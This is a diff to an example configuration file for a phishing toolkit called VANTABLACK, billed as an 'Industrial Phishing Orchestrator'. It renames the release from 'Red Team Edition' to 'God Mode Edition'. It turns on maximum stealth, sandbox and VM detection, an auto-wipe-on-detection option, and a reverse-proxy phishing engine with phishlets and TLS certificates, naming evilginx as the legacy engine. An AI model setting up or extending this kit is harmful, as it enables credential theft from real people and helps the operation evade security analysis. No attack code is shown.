@@ -3,8 +3,8 @@
 # Copy this file to hitch_config.yaml and customize
 
 name: "VANTABLACK"
-version: "3.1.0"
-description: "Industrial Phishing Orchestrator - Red Team Edition"
+version: "4.0.0"
+description: "Industrial Phishing Orchestrator - God Mode Edition"
 
 # ===========================================
 # NOTIFICATIONS
@@ -29,8 +29,8 @@ evasion:
   # 2 = Low (basic evasion)
   # 3 = Medium (recommended)
   # 4 = High (advanced detection)
-  # 5 = Maximum (paranoid mode)
-  stealth_level: 3
+  # 5 = Maximum (God Mode - Paranoid)
+  stealth_level: 5
   
   # Detection techniques
   sandbox_detect: true        # Detect sandbox environments
@@ -38,19 +38,27 @@ evasion:
   battery_check: true        # Battery status detection
   automation_check: true     # Detect automation tools
   vm_detect: true            # Virtual machine detection
+  ghost_protocol_auto: false # Auto-wipe on detection (DANGEROUS)
   
   # Browser fingerprinting
   user_agent_rotation: true
   canvas_randomization: true
-  webrtc_blocking: false
+  webrtc_blocking: true
 
 # ===========================================
-# PROXY SETTINGS
+# PROXY SETTINGS (VantaProxy)
 # ===========================================
 
 proxy:
-  enabled: false
+  enabled: true
+  engine: "vantaproxy"        # vantaproxy, evilginx (legacy)
+  port: 8080
+  phishlets_path: "./phishlets"
   rotation: "round-robin"     # Options: round-robin, random, sequential
+  
+  # SSL/TLS
+  ssl_cert: "certs/cert.pem"
+  ssl_key: "certs/key.pem"
   
   # Proxy sources (one per line)
   # Format: ip:port or ip:port:username:password
